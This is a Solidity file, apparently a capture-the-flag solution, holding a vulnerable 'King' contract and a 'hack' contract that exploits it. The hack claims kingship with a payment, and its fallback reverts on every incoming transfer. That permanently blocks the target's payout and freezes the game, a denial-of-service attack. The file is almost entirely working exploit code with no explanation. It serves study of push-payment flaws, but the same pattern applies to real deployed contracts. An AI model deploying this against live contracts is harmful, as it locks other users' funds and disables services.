// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}

contract hack {
    King target ;
    constructor(address payable _address) {
        target = King(_address);
    }

    function claimKingship() public payable {
        (bool result , ) =payable(address(target)).call{value : 1000000000000010}("");
        require(result , "sending eth failed");
        require(target._king()==address(this) , "claiming kingship failed ");
    }

    fallback() external {
        revert();
    }
}